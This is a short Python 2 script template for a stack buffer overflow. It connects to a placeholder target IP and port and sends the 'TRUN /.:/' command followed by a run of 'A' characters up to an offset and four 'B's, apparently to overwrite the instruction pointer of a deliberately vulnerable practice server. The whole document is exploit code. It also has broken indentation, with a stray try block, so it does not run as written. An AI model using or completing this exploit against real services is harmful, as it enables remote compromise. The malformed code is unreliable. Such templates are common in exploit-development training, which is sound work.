```
#!/usr/bin/python
import sys,socket
from time import sleep

shellcode = "A" * <offset> + "B" * 4

	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('<target IP>,<target port>'))
		s.send(('TRUN /.:/' + shellcode))
		s.close()

	except:
		print "Error connecting to server"
		sys.exit()
```